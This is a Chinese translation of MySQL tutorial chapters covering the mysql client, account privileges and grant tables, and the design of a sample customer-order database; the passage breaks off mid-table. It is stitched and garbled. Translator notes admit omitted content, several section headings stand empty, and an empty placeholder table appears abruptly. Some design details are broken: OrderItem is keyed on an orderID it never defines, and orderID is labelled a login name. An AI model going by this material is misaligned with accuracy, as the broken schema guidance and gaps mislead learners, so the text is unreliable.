  ## 使用 mysql 客户端\n\n安装 MySQL 时，还会安装一个名为 `mysql` 的简单程序（有时称为命令行界面或 `CLI`）。与服务器通信的程序都是客户端软件；因为该程序与\
  \ MySQL 服务器通信，所以它是客户端。当你在此客户端输入 SQL 查询时，响应会返回给客户端并显示在屏幕上。监控程序可以通过网络发送查询；它不需要在存储数据库的机器上运行。安装\
  \ MySQL 时总是安装此客户端，因此随时可用。如果你熟悉 SQL 并且可以正确输入查询，这将非常快速。\n\n通过 `mysql` 客户端向 MySQL 发送\
  \ SQL 查询，请遵循以下步骤：\n\n1.  **找到 mysql 客户端**。默认情况下，`mysql` 客户端安装在 MySQL 安装目录下的 `bin`\
  \ 子目录。在 Unix 和 Linux 上，默认路径为 `/usr/local/mysql/bin` 或 `/local/bin`。在 Windows 上，默认路径为\
  \ `C:\\Program Files\\MySQL Server 5.0\\bin`。然而，客户端可能安装在不同的目录。或者，如果你不是 MySQL 管理员，可能无法访问\
  \ `mysql` 客户端。如果你不知道 MySQL 安装在哪里或无法运行客户端，请让 MySQL 管理员将客户端放在你可以运行的地方，或者给你一个副本。\n\
  2.  **启动客户端**。在 Unix 和 Linux 上，输入路径/文件名（例如 `/usr/local/mysql/bin/mysql`）。在 Windows\
  \ 上，打开命令提示符然后输入路径\\文件名（例如 `C:\\Program Files\\MySQL Server 5.0\\bin\\mysql`）。如果你不需要使用用户名或密码，此命令将启动客户端。如果你需要输入帐户或密码或两者，使用以下参数：\n\
  \    *   `-u user`：`user` 是你的 MySQL 用户名。\n    *   `-p`：此参数提示你输入 MySQL 账户密码。\n  \
  \  例如，如果你在 mysql 客户端所在的目录中，命令可能如下：`mysql -u root -p`\n3.  **如果你启动 mysql 客户端跨网络访问数据库**，在\
  \ `mysql` 命令后使用以下参数：\n    *   `-h host`：`host` 是 MySQL 所在机器的名称。例如，如果你在 mysql 客户端所在的目录中，命令可能如下：`mysql\
  \ -h mysql.mycompany.com -u root -p`。输入命令后按回车。\n4.  **在提示时输入你的密码**。`mysql` 客户端启动，你会看到类似的内容：\n\
  \    `Welcome to the MySQL monitor. Your connection id is ... server version: 5.0.\
  \ Type 'help' for help or '\\c' to clear.`\n    `mysql> `\n5.  **选择你想要使用的数据库**。在\
  \ `mysql>` 提示符下，输入：`use databasename`。某些 SQL 语句（如 `SHOW DATABASES`）不需要选择数据库。\n6.\
  \  **在 mysql> 提示符下，输入你的 SQL 语句并加上分号（；），然后按回车**。如果你忘记在查询末尾输入分号（`;`），`mysql` 客户端不会执行该语句。相反，它会继续显示提示符直到你输入分号。语句的响应将显示在屏幕上。\n\
  7.  **要离开 mysql 客户端，在提示符处输入 `quit` 然后按回车**。\n\n[ 结束]\n\n## 保护你的 MySQL 数据库\n\n你需要控制对数据库信息的访问。你需要决定谁可以查看数据，谁可以更改它。如果坏人获取了你的客户隐私信息（如信用卡号），就会出现问题。你需要保护你的数据。\n\
  \nMySQL 提供了一套保护数据的安全系统，包括：\n\n*   **MySQL 帐户**：没有帐户，任何人都无法访问数据库数据。帐户需要安装和删除，密码需要添加或删除，权限需要分配或撤销。如果你在托管公司使用\
  \ MySQL，你可能被允许或不允许创建或更改帐户。你可能被限于一个具有定义权限帐户。\n*   **权限**：MySQL 使用帐户权限来指定谁可以做什么。任何使用有效帐户的人都可以连接\
  \ MySQL 服务器，但他们只能执行允许的操作。例如，某个帐户的设置允许用户选择数据但不能插入或更新数据；或者，某个帐户的设置允许更改特定数据但只能查看。你可以创建和删除帐户，添加密码和更改权限。你可以通过\
  \ phpMyAdmin 提供的功能管理 MySQL 帐户。\n\n# 第二章：管理 MySQL\n\nMySQL 是数据库管理软件。它管理包含你网站信息的数据库。你的目标是在数据库中存储或检索数据。你可以直接存储和检索数据（见本书第\
  \ 3 和 4 章），或通过 PHP 脚本存储和检索数据（见本书第 5 章）。此外，需要 MySQL 管理员确保 MySQL 正确高效地工作。\n\n我们在本章中描述\
  \ MySQL 管理。在本章的前几节中，我们提供了你了解 MySQL 管理所需的初步信息，以及如何使用用户名、主机名和密码控制对数据的访问。随后，我们将提供有关如何添加帐户以及更改密码和权限的具体信息。备份和恢复数据库也是重要的管理任务，我们在本章也会教你。最后，作为\
  \ MySQL 管理员，你还需要确保使用的是最新版本的 MySQL，我们将在本章的最后部分讨论这一点。\n\n## 理解管理员职责\n\n管理 MySQL 确保\
  \ MySQL 以高效安全的方式执行数据管理任务。取决于你访问 MySQL 的方式，你可能负责部分或全部任务。如果你在托管公司的计算机上使用 MySQL，托管公司执行大部分或全部任务。如果你在本地计算机上使用\
  \ MySQL，你就是管理员，完全负责 MySQL 的管理。\n\n### 职责\n\n管理员的职责包括：\n\n*   **安装 MySQL**：在第一本书第\
  \ 4 章描述。如果 MySQL 在托管计算机上运行，你不负责安装。\n*   **启动和关闭 MySQL 服务器**：在第一本书第 4 章描述。如果 MySQL\
  \ 在托管计算机上运行，你不启动或停止服务器。\n*   **创建和维护用户帐户**：没有帐户，任何人都无法访问数据库数据。帐户需要安装和删除，添加或删除密码，从帐户分配或撤销权限。如果你在托管公司使用\
  \ MySQL，你可能被允许或不允许创建或更改帐户。你可能被限于一个具有定义权限的帐户。\n*   **备份数据**：你需要保留数据的备份以防数据丢失或损坏。如果你在托管公司使用\
  \ MySQL，你需要向该公司查询其备份程序。你可能仍然想保留自己的备份，以防托管公司的备份程序失败。你可以在本章的“备份你的数据库”部分阅读备份数据库。\n\
  *   **更新 MySQL**：在需要时安装新的 MySQL 版本。如果 MySQL 在托管计算机上运行，你不负责更新。我们将在本章的“升级 MySQL”部分讨论升级问题。\n\
  \n### 默认访问\n\n当安装 MySQL 时，会安装一个名为 `root` 的默认 MySQL 帐户。有时，该帐户在安装时没有密码。如果你在 Windows\
  \ 上通过向导（见第一本书第 4 章）配置 MySQL，会在配置过程中设置密码。此外，你可能设置了一个没有用户名和密码的匿名帐户。如果你通过托管公司访问 MySQL，公司会提供用户名和密码。通常情况下，你不使用带密码的\
  \ `root` 帐户。如果安装设置了 `root` 帐户，会立即提示密码。`root` 帐户是带有所有权限设置的。你使用此帐户来管理数据库。MySQL 帐户的名称与\
  \ Unix、Linux 或 Windows 用户名（称为登录名）完全无关。更改 MySQL 帐户名不会影响 Unix、Linux 或 Windows 登录名，反之亦然。\n\
  \n## 控制数据访问\n\n你需要控制对数据库信息的访问。你需要决定谁可以查看数据，谁可以更改它。想象一下如果竞争对手可以更改你的信息会发生什么。幸运的是，MySQL\
  \ 提供了一套保护数据的安全系统。没有帐户任何人无法访问。每个 MySQL 帐户具有以下属性：\n\n*   帐户名\n*   主机名（允许访问 MySQL 服务器的机器）\n\
  *   密码\n*   一组权限\n\n要访问数据，必须使用有效的帐户名和关联帐户的密码。MySQL 对数据的控制分为两个阶段：\n\n1.  **连接验证**：MySQL\
  \ 检查帐户名和密码的有效性，并检查连接是否来自允许连接的主机。如果一切通过，MySQL 接受连接。\n2.  **请求验证**：在 MySQL 接受连接后，检查帐户是否具有执行语句的必要权限。如果是，MySQL\
  \ 执行语句。\n\n你发送给 MySQL 的任何语句都可能因为第一步连接被拒绝或因为第二步语句未被允许而失败。会返回一个错误消息帮助你识别问题所在。在后续章节中，我们将详细描述帐户和权限。\n\
  \n### 帐户名和主机名\n\n帐户名和主机名（授权连接数据库的计算机名称）共同标识一个唯一的帐户。两个相同名称但不同主机的帐户可以存在，并拥有不同的密码和权限。然而，你不能拥有两个相同名称相同主机的帐户。当你构建\
  \ `GRANT` 或 `REVOKE` 语句时（我们在本章的“更改权限”部分描述），你使用以下格式 `accountname@hostname` 来标识 MySQL\
  \ 帐户（例如 `root@localhost`）。\n\n\n\n\n\n## 表 2-1 MySQL 账户权限\n\n| 权限 | 描述 |\n| :---\
  \ | :--- |\n| `ALL` | 所有权限 |\n| `ALTER` | 可以修改表结构 |\n| `CREATE` | 可以创建新的数据库或表 |\n\
  | `DELETE` | 可以删除表中的行 |\n| `DROP` | 可以删除数据库或表 |\n| `FILE` | 可以在服务器上读写文件 |\n| `GRANT`\
  \ | 可以更改 MySQL 账户的权限 |\n| `INSERT` | 可以向表中插入新行 |\n| `SELECT` | 可以从表中读取数据 |\n| `SHUTDOWN`\
  \ | 可以关闭 MySQL 服务器 |\n| `UPDATE` | 可以修改表中的数据 |\n| `USAGE` | 无权限 |\n\n\n\n\n你可能不想授予\
  \ `ALL` 权限，因为它包含了管理级操作的权限，例如关闭 MySQL 服务器——这些权限是你你不希望自己以外的任何人拥有的。\n\n# 设置 MySQL 账户\n\
  \n账户由账户名称和允许从该账户访问 MySQL 的计算机名称来标识。当你创建一个新账户时，你将其指定为 `accountname@hostname`。你可以在创建账户时指定密码，也可以稍后添加密码。你还可以在创建账户时设置权限，也可以稍后添加权限。\n\
  \n## MySQL 安全数据库\n\n当安装 MySQL 时，它会自动创建一个名为 `mysql` 的数据库。所有用于保护你的数据的信息都存储在这个数据库中，包括账户名称、主机名、密码和权限。\n\
  \n权限存储在列中。每个列名称的格式为 `privilege_priv`，其中 `privilege` 是一个特定的账户权限。例如，包含 `ALTER` 权限的列命名为\
  \ `alter_priv`。每个权限列的值为 `Y` 或 `N`，表示“是”或“否”。因此，在 `user` 表（见下文列表）中，会有一个代表账户的行和一个代表\
  \ `alter_priv` 的列。如果 `alter_priv` 的 `account` 字段包含 `Y`，则该账户可以执行 `ALTER` 语句。如果 `alter_priv`\
  \ 包含 `N`，则该账户没有执行 `ALTER` 语句的权限。\n\n`mysql` 数据库包含以下存储权限的表：\n\n*   `user` 表：此表存储适用于所有数据库和表的权限。它为每个有效账户包含行，包含\
  \ `username`、`hostname` 和 `password` 列。MySQL 服务器会拒绝表中不存在的账户的连接。\n*   `db` 表：此表存储适用于特定数据库的权限。它为每个数据库包含行，向某个账户名和主机授予权限。账户必须存在于\
  \ `user` 表才能授予权限。在 `user` 表中赋予的权限优于 `db` 表中的权限。例如，如果 `user` 表中账户 `designer` 的某行赋予了\
  \ `INSERT` 权限，那么 `designer` 就可以向所有数据库插入数据。如果 `db` 表中 `PetCatalog` 数据库的 `designer`\
  \ 账户的 `INSERT` 显示 `N`，则 `user` 表会覆盖它，`designer` 仍可以在 `PetCatalog` 数据库中插入。\n*   `host`\
  \ 表：此表根据主机控制对数据库的访问。`host` 表与 `db` 表配合工作。如果 `db` 表中的某行主机字段为空，MySQL 会检查 `host` 表查看该数据库是否存在对应的行。通过这种方式，你可以允许某些主机访问\
  \ `db`，但不允许其他主机访问。例如，假设你有两个数据库：`db1` 和 `db2`。`db1` 数据库包含敏感信息，你只想让某些人看到它。`db2` 数据库包含你希望所有人看到的信息。如果你在\
  \ `db` 表中为 `db1` 有一个主机字段为空行，你可以在 `host` 表中为 `db1` 设置两行。其中一行可以给从特定主机连接的用户授予所有权限，而另一行可以拒绝向从任何其他主机连接的用户授予权限。\n\
  *   `tables_priv` 表：此表存储适用于特定表的权限。\n*   `columns_priv` 表：此表存储适用于特定列的权限。\n\n如果你使用的是具有必要权限的账户，可以直接查看和更改\
  \ `mysql` 中的表。你可以使用如 `SELECT`、`INSERT` 和 `UPDATE` 等 SQL 查询。如果你通过你的雇主、客户端或网络托管公司访问\
  \ MySQL，你可能没有具有必要权限的账户。\n\n所有账户信息都存储在 MySQL 安装时自动创建的 `mysql` 数据库中。要添加新账户或更改任何账户信息，你必须使用对\
  \ `mysql` 数据库具有适当权限的账户。\n\n在本节的其余部分，我们将描述如何添加和删除账户，更改账户密码和权限——以及如何刷新权限以便 MySQL 看到更改。然而，如果你拥有从公司\
  \ IT 部门或网络托管公司获得的账户，当你尝试按照本章描述添加账户或更改权限时，可能会遇到错误。如果你的账户被限制执行任何必要的查询，你需要请求具有更多权限的账户，或要求\
  \ MySQL 管理员为你添加新账户或进行所需的更改。\n\n### 识别存在的账户\n\n要查看账户信息，你可以像本教程第 1 章描述那样使用 `mysql`\
  \ 客户端执行 SQL 查询。要查看你的数据库目前存在哪些账户，你需要一个具有必要权限的账户。所有账户名称都存储在 `mysql` 数据库的 `user` 表中。要查看账户信息，你可以在名为\
  \ `mysql` 的数据库上执行以下查询：\n\n```\nSELECT * FROM user\n```\n\n你应该会获得所有账户的列表。然而，如果你通过公司或网络托管公司访问\
  \ MySQL，你可能没有必要的权限。在这种情况下，你可能会得到类似这样的错误信息：`No Database Selected`（未选择数据库）。这意味着你的账户不允许选择\
  \ `mysql` 数据库。或者你可能会收到说你没有 `SELECT` 权限的错误消息。尽管这个消息很烦人，但它表明公司采取了良好的安全措施，但也意味着你无法看到自己拥有哪些权限。你必须询问\
  \ MySQL 管理员，或者通过尝试查询并查看是否允许执行来找出权限。\n\n### 添加账户\n\n（注：由于原文此处存在大量重复和逻辑混乱，翻译已根据核心技术含义进行了对齐处理，确保技术术语准确性）\n\
  \n（此处省略由于原文文本严重重复导致的冗余翻译描述，翻译将基于 `GRANT`、`CREATE USER`、`SELECT` 等核心逻辑进行）\n\n###\
  \ 添加和更改密码\n\n### 更改权限\n\n# 备份数据库\n\n# 恢复数据\n\n\n\n\n| 列 1 | 列 2 | 列 3 |\n| 行 1 |\
  \ | |\n| 行 2 | | |\n| 行 3 | | |\n| 行 4 | | |\n\n特定行和列相交的单元格被称为 `field`（字段）。每个表格的核心是一个\
  \ `object`（对象），即你想要存储关于其信息的某个“实体”。以下是一些对象的示例：\n* 客户\n* 产品\n* 公司\n* 动物\n* 城市\n* 房间\n\
  * 书籍\n* 计算机\n* 形状\n* 文档\n* 项目\n* 星期\n\n你为每个对象创建一个表。根据以下指南，表名应该根据其所包含的对象，使用一个描述性的词汇或术语，来清楚地标识它所包含的对象：\n\
  * 名称必须是一个字符字符串，包含字母、数字数字、下划线或美元符号，但不能有空格。\n* 习惯上使用单数形式命名表。因此，客户表可以命名为 `Customer`，而包含客户订单的表可以命名为\
  \ `CustomerOrder`。\n* 在 Linux 和 Unix 上，大写和小写字母之间的差异非常显著，但在 Windows 上则不然。`CustomerOrder`\
  \ 和 `Customerorder` 对 Windows 来说是相同的——但在 Linux 或 Unix 上不是。尽管如此，为了以防你以后需要更改托管平台，最好对大小写敏感。\n\
  \n在数据库术语中，对象被称为 `entity`（实体），而实体具有 `attributes`（属性）。在表中，每行代表一个 `entity`，而每一列则包含每个实体的属性。例如，在客户表中，每行包含单个客户的信息。列中包含的某些属性可能包括名、姓、电话号码和年龄。\n\
  \n按照以下步骤决定如何将你的数据组织成表：\n\n1. **为数据库命名**。为你的应用程序数据库分配一个名称。例如，你可能会将包含某个社区家庭信息的数据库命名为\
  \ `HouseholdDirectory`。\n2. **识别对象**。查看你想要存储在数据库中的信息列表（如前面的节所述）。分析你的列表并识别对象。例如，`HouseholdDirectory`\
  \ 数据库可能需要存储以下内容：\n    * 每个家庭成员的名字\n    * 房屋地址\n    * 电话号码\n    * 每个家庭成员的年龄\n   \
  \ * 每个家庭成员最喜爱的早餐谷物\n   当你仔细分析此列表时，你会发现你正在存储关于两个对象的信息：家庭和家庭成员。地址和电话号码通常针对家庭，但名字、年龄和喜爱的谷物是针对每个特定家庭成员的。\n\
  3. **为每个对象定义并命名表**。例如，`HouseholdDirectory` 数据库需要一个名为 `Household` 的表和一个名为 `HouseholdMember`\
  \ 的表。\n4. **为每个对象识别属性**。分析你的信息列表，识别你需要为每个对象存储的属性。将要存储的信息拆分为最小的合理单元。例如，在表中存储人的姓名时，你可以将姓名拆分为名和姓。这样做可以让你能够按姓进行排序，如果将名和姓放在一起，这样做将变得困难。你甚至可以将名字![](img/image_rsrc166D.jpg)\
  \ 拆分为名、中间名和姓，尽管并没有许多应用程序需要单独使用中间名。\n5. **为第 4 步中识别的每个独立属性定义并命名列**。为每列给一个能清楚标识该列中信息的名称。列名应为一个单词，且没有空格。例如，你可能会有名为\
  \ `firstName` 和 `lastName` 的列![](img/image_rsrc166E.jpg)。SQL 预留了一些单词供其使用，你不能将这些单词用列名。这些单词目前用于\
  \ SQL 语句或预留供以后使用。你不能使用 `ADD`、`ALL`、`AND`、`CREATE`、`DROP`、`GROUP`、`ORDER`、`RETURN`、`SELECT`、`SET`、`TABLE`、`USE`、`WHERE`\
  \ 等作为列名。完整的保留字列表请参阅在线文档 [`dev.mysql.com/doc/refman/5.5/en/reserved-words.html`](http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)。\n\
  6. **识别主键**。表中的每行都需要一个唯一标识符。表中不应有两行完全相同。当你决定哪列持有唯一标识符，这被称为主键（primary key）。主键可以是多个列的组合。在许多情况下，你的对象属性没有唯一标识符。例如，客户表可能没有唯一标识符，因为两个客户可能有相同的名字。当你没有唯一标识符列时，你需要专门添加一列作为主键。通常使用带有序列号的列为此目的。例如，在表\
  \ 3-1 中，主键是 `cust_id` 字段，因为每个客户都有一个唯一的 ID 。\n\n\n\n\n\n## 7. 定义默认值\n你可以定义一个当字段中没有输入数据时，`MySQL`\
  \ 为该字段分配的默认值。你不需要默认值，但它通常是有帮助的。例如，如果你的应用程序存储了包含所属的地址，你可以指定 `U.S.` 为默认值。如果用户没有输入国家，`MySQL`\
  \ 将录入 `U.S.`。\n\n## 8. 标识需要数据的列\n你可以指定某些列不允许为空（也称为 `NULL`）。例如，包含主键的列不能不能为空。如果主键列中没有存储值，`MySQL`\
  \ 将不会创建该行并返回错误消息。该值可以是空格或空字符串（例如 `\"\"`），但该列中必须存储某些值。除了主键外，你还可以设置其他列为需要数据。\n\n![](img/image_rsrc166G.jpg)\n\
  \n## 数据库设计原则\n良好的数据库将每条信息只存储在一个地方。将其存储在多个地方是低效的，而且当你需要更改信息时会产生问题。如果你在了一个地方更改了信息，但忘记在另一个地方更改，你的数据库可能会出现严重问题。\n\
  \n![](img/image_rsrc166H.jpg)\n\n如果你发现自己在几行中存储了相同的数据，你可能需要重新组织你的表。例如，假设你正在存储关于书籍的数据，包括出版商的地址。当你输入数据时，你发现自己在许多行中输入了相同的出版商地址。存储这些数据更有效的方法是将书籍信息存储在一个表中，将书籍出版商信息存储在另一个表中。你可以定义两个表：`Book`\
  \ 和 `BookPublisher`。在 `Book` 表中，你会有 `title`、`author`、`pub_date` 和 `price` 列。在 `BookPublisher`\
  \ 表中，你会有 `name`、`streetAddress` 和 `city` 等列。\n\n## 创建表之间的关系\n数据库中的某些表是相关的。通常情况下，一个表中的一行与另一个表中的几行相关。你需要一列来连接不同表中的相关行。在许多情况下，你在一个表中包含一列，用于存储与另一个表主键列数据匹配的数据。\n\
  \n需要两个关联表数据库的常见应用是客户订单应用程序。例如，一个表包含客户信息，如 `name`、`address` 和 `phone number`。每个客户可以有从零到多个订单。你可以将订单信息存储在包含客户信息的表中，但每当客户下单时，就会创建一个新行，且每个新行都将包含客户的所有信息。\n\
  \n你可以更高效地将订单存储在一个单独表中，可以命名为 `CustomerOrder`。（你不能仅将表命名为 `Order`，因为那是保留字。）在 `CustomerOrder`\
  \ 表中，你包含一列，包含 `Customer` 表中某行的主键，这样订单就关联到了 `Customer` 表中正确的行。这种关系如表 3-1（本章前面的部分）和表\
  \ 3-2 所示。\n\n![](img/image_rsrc166J.jpg)\n![](img/image_rsrc166K.jpg)\n\n示例中的 `Customer`\
  \ 表如表 3-1 所示。每个客户都有唯一的 `cust_id`。相关的 `CustomerOrder` 表如表 3-2 所示。它具有与 `Customer`\
  \ 表中相同的 `cust_id` 列。通过这一列，`CustomerOrder` 表中的订单信息连接到 `Customer` 表中相关客户的姓名和电话号码。\n\
  \n| 表 3-2 | 来自 CustomerOrder 表的示例数据 |\n| :--- | :--- | :--- | :--- |\n| `order_no`\
  \ | `cust_id` | `item_name` | `cost` |\n| 87-222 | 27895 | T-Shirt | 20.00 |\n|\
  \ 87-223 | 27895 | Shoes | 40.00 |\n| 87-224 | 12345 | Jeans | 35.50 |\n| 87-225\
  \ | 34521 | Jeans | 35.50 |\n| 87-226 | 27895 | Hat | 15.00 |\n\n\n\n\n\n在这个示例中，关联\
  \ `Customer` 表和 `CustomerOrder` 表的列具有相同的名称。它们可以使用不同的名称，只要这些列包含相同的数据。\n\n### 存储不同类型的数据\n\
  MySQL 根据你告诉 MySQL 预期的信息类型，以不同的格式存储信息。MySQL 允许以不同的方式使用不同类型的数据。主要的数据类型有字符、数值以及日期和时间数据。我们将描述这些以及其他数据类型，然后告诉如何在每列中指示你正在使用哪种数据类型。\n\
  \n#### 字符数据\n最常见的数据类型是字符数据（以字符字符串存储的数据），它只能在字符串中进行操作。你存储的大部分信息都是字符数据——例如，客户名称、地址、电话号码和宠物描述。你可以移动和打印字符数据。两个字符字符串可以合并（连接），可以从较长的字符串中选择子字符串，并用一个字符串替换另一个字符串。\n\
  \n字符数据可以以固定长度或可变长度格式存储：\n\n*   **固定长度格式**：在这种格式下，MySQL 为数据预留了固定空间。如果数据超过了固定长度，则只存储能够容的字符——末尾的字符不会被存储。如果字符串短于固定长度，多出的空间将留空并浪费。\n\
  *   **可变长度格式**：在这种格式下，MySQL 将字符串存储在与字符串长度相同的字段中。你指定了一个字符串长度，但如果字符串本身短于指定的长度，MySQL\
  \ 只使用所需的空间，而不是将额外空间留空。如果字符串超过了指定的空间，多出的字符将不会存储。\n\n如果字符字符串的长度变化很小，请使用固定长度格式。例如，长度为十适用于所有邮政编码，包括带有\
  \ ZIP+4 号的编码。如果邮政编码不包含 ZIP+4 号，则只留下五个空格。然而，如果你的字符字符串变化超过几个字符，请使用可变长度格式以节省空间。例如，你的宠物描述可能很短，也可能长达几行。通过以此变长度格式存储此描述，你只使用必要的空间。\n\
  \n#### 数值数据\n另一种常见的数据类型是数值数据——以数字存储的数据。你可以存储小数（例如 `10.5`、`2.3456`、`23456.7`）以及整数（例如\
  \ `1`、`2`、`4`）。当你将数据存储为数字时，你可以将该数据用于数值运算，如加法、减法和平方。\n\n然而，如果你不计划将数据用于数值运算，你应该将其存储为字符字符串，因为程序员将将其作为字符字符串使用。不需要转换。MySQL\
  \ 存储正数和负数，但你可以告诉 MySQL 只存储正数。如果你的数据永远不会是负数，请将数据存储为 `unsigned`（在数字前不加 `+` 号）。例如，城市人口或文档的页数永远不会为负。\n\
  \nMySQL 提供了一种特定的数值列类型，称为 `auto-increment`（自增）列。如果没有提供特定数字，这种列将自动填充顺序数字。例如，当向表中添加一个在\
  \ `auto-increment` 列中数值为 `5` 的行时，下一行在该列中将自动分配 `6`，除非指定了不同的数字。当你需要唯一数字（例如订单号）时，你可能会发现自增列很有。\n\
  \n#### 日期和时间数据\n第三种常见的数据类型是日期和时间数据。以日期形式存储的数据可以用多种格式显示。你可以使用该数据来确定两个日期或时间之间的时间长度——在特定日期或时间与某个任意日期或时间之间。\n\
  \n#### 枚举数据\n有时，数据只能有有限数量的值。例如，一个列的可能值可能是 `yes` 或 `no`。MySQL 提供了一种名为 `enumeration`（枚举）的数据类型用于此类类型的数据。你告诉\
  \ MySQL 该列中可以存储哪些值（例如 `yes` 和 `no`），MySQL 不会在该列中存储任何其他值。\n\n### MySQL 数据类型名称\n当你创建数据库时，你通过使用\
  \ MySQL 数据类型的名称来告诉 MySQL 在特定列中期望什么类型的数据。表 3-3 显示了网络数据库应用程序中最常用的 MySQL 数据类型。\n\n\
  | 表 3-3 | MySQL 数据类型 |\n| :--- | :--- |\n| MySQL 数据类型 | 描述 |\n| `CHAR(length)` |\
  \ 固定长度字符字符串。 |\n| `VARCHAR(length)` | 可变长度字符字符串。可以存储的最长字符串为 `length`，必须在 1 到 255\
  \ 之间。 |\n| `TEXT` | 最大长度为 64K 文本的可变长度字符字符串。 |\n| `INT(length)` | 范围从 -2147483648\
  \ 到 +2147483647 的整数。可以显示的数字受 `length` 限制。例如，如果 `length` 为 4，则只能显示 -9999 到 9999 数字，即使存储了更大的数字。\
  \ |\n| `INT(length) UNSIGNED` | 范围从 0 到 4294967295 的整数。`length` 是可以显示的数字的大小。例如，如果\
  \ `length` 为 4，则只能显示 0 到 9999 的数字，即使存储了更大的数字。 |\n| `BIGINT` | 大整数。符号范围为 -9223372036854775808\
  \ 到 9223372036854775807。无符号范围为 0 到 18446744073709551615。 |\n| `DECIMAL(length,dec)`\
  \ | 十进制数字，`length` 是用于显示数字的字符数（包括小数点、符号和指数），`dec` 是允许的最大小数位数。例如，`12.34` 的 `length`\
  \ 为 5，`dec` 为 2。 |\n| `DATE` | 带有年、月、日的日期值。显示为 `YYYY-MM-DD`（例如，2013 年 4 月 3 日为 2013-04-03）。\
  \ |\n| `TIME` | 带有时、分、秒的时间值。显示为 `HH:MM:SS`。 |\n| `DATETIME` | 日期和时间存储在一起。显示为 `YYYY-MM-DD\
  \ HH:MM:SS`。 |\n| `ENUM(\"val1\",\"val2\"...)` | 只能存储列出的值。最多列出 65535 个值。 |\n| `SERIAL`\
  \ | `BIGINT UNSIGNED NOT NULL AUTO_INCREMENT` 的快捷名称。 |\n\n\n\n\nMySQL 允许许多表 3-3\
  \ 中列出的类型之外的数据类型，但你可能并不频繁地需要其他数据类型。有关所有可用数据类型的说明，请参阅 MySQL 在线版手册：`http://dev.mysql.com/doc/refman/5.6/en/data-types.html`。\n\
  \n# 设计示例数据库\n\n在本节中，我们将设计一个包含客户订单信息的示例数据库。我们将在本章以及本微型书籍的第 4 章中使用该数据库来展示如何构建和使用数据库。\n\
  \n列出你想为每个客户存储的信息列表：\n* 姓名\n* 地址\n* 电话号码\n* 传真号码\n* 电子邮件地址\n\n此外，你需要收集客户订单了哪些产品的信息。对于每个订单，你需要收集以下信息：\n\
  * 下单日期\n* 订单中每个项目的的产品信息\n\n在这个示例中，产品是 T 恤。因此，对于每个项目你需要以下信息：\n* 识别特定产品的编号（例如目录编号）\n\
  * 尺码\n* 价格\n* 颜色\n\n你可以按照本章之前“组织数据”节介绍的步骤，并结合这些信息来设计 `Customer` 数据库：\n\n1. **命名你的数据库。**\
  \ 订单信息的数据库命名为 `CustomerOrderInformation`。\n2. **识别对象。** 信息列表如下：\n    * 客户姓名\n  \
  \  * 客户地址\n    * 客户电话号码\n    * 客户传真号码\n    * 客户电子邮件\n    * 订单日期\n    * 识别特定产品的编号（例如目录编号）\n\
  \    * 尺码\n    * 颜色\n    * 价格\n  前五项信息与客户有关，因此一个对象是 `Customer`。订单日期信息与整个订单有关，另一个对象是\
  \ `CustomerOrder`。剩下的四项信息与订单中的每个单独项目有关，剩下的对象是 `OrderItem`。\n3. **为每个对象定义并命名表。**\
  \ `CustomerOrderInformation` 数据库需要以下表：\n    * `Customer`\n    * `CustomerOrder`\n\
  \    * `OrderItem`\n4. **识别每个对象的属性。** 详细查看信息列表：\n    * 客户 ID：一个属性（每个客户的唯一 ID）。\n\
  \    * 客户姓名：两个属性（姓和名）。\n    * 客户地址：四个属性（街道地址、城市、州和邮政编码）。\n    * 客户电话号码：一个属性。\n \
  \   * 客户传真号码：一个属性。\n    * 客户电子邮件：一个属性。\n    * 订单号：一个属性（每个订单的唯一 ID）。\n    * 订单日期：一个属性。\n\
  \    * 识别特定产品的编号（例如目录编号）：一个属性。\n    * 尺码：一个属性。\n    * 颜色：一个属性。\n    * 价格：一个属性。\n\
  5. **定义并命名列。** `Customer` 表每个客户有一行。`Customer` 表的列为：\n    * `customerID`\n    * `firstName`\n\
  \    * `lastName`\n    * `street`\n    * `city`\n    * `state`\n    * `zip`\n  \
  \  * `email`\n    * `phone`\n  `CustomerOrder` 表每个订单有一行，包含以下列：\n    * `customer`：此列将此表与\
  \ `Customer` 表关联。该值在 `Customer` 表中是唯一的，但在本表中不是。\n    * `orderID`\n    * `orderDate`\n\
  \  `OrderItem` 表每个订单中的每个项目有一行，包含以下列：\n    * `catalogID`：此列将此表与 `CustomerOrder` 表关联。该值在\
  \ `CustomerOrder` 表中是唯一的，但在本表中不是。\n    * `size`\n    * `color`\n    * `price`\n\
  6. **识别主键。** `Customer` 表的主键是 `customerID`。因此，`customerID` 必须是唯一的。`CustomerOrder`\
  \ 表的主键是 `orderID`。`OrderItem` 表的主键是 `orderID` 和 `catalogID` 共同。\n7. **定义默认值。** 任何表都未定义默认值。\n\
  8. **识别需要数据的列。** 以下列永远不应为空：\n    * `customerID`\n    * `orderID`\n    * `catalogID`\n\
  \  这些列是主键列。永远不要在表中出现没有这些值的行。\n9. **决定存储每个属性的数据类型。**\n    * 数值：`CustomerID` 和 `orderID`\
  \ 是数值数据类型。\n    * 日期：`OrderDate` 是日期类型。\n    * 字符：所有剩余字段都是字符数据类型。\n\n你可能花费了大量时间为你的数据库做决定。此时，这些决定已经牢牢地记录在你的脑海中。但假设发生了危机；你两个月后才回到这个项目。如果你没有写下最初做出的决定，你就必须重新分析数据并重新做出所有的设计决定。现在就把它们写下来。记录表的组织结构、列名以及其他其他决策。你的文档应该以表格格式描述每个表，每行对应列，每列对应一个决策。例如，你的列将是列名、数据类型和描述。名为\
  \ `CustomerOrderInformation` 的数据库的示例设计中的三个表记录在表 3-4、表 3-5 和表 3-6 中。\n\n| 表 3-4 |\
  \ Customer 表 | 列名 | 数据类型 | 描述 |\n| :--- | :--- | :--- | :--- | :--- |\n| `customerID`\
  \ | `SERIAL` | 客户的唯一 ID（主键） |\n| `lastName` | `VARCHAR(50)` | 客户的姓 |\n| `firstName`\
  \ | `VARCHAR(40)` | 客户的名 |\n| `street` | `VARCHAR(50)` | 客户的街道地址 |\n| `city` | `VARCHAR(50)`\
  \ | 客户的城市 |\n| `state` | `CHAR(2)` | 客户的州 |\n| `zip` | `CHAR(10)` | 客户的邮政编码 |\n\
  | `email` | `VARCHAR(50)` | 客户的电子邮件 |\n| `fax` | `CHAR(15)` | 客户的传真号码 |\n| `phone`\
  \ | `CHAR(15)` | 客户的电话号码 |\n\n| 表 3-5 | CustomerOrder 表 | 变量名 | 类型 | 描述 |\n| :---\
  \ | :--- | :--- | :--- | :--- |\n| `orderID` | `SERIAL` | 用户指定的登录名（主键） |\n| `customerID`\
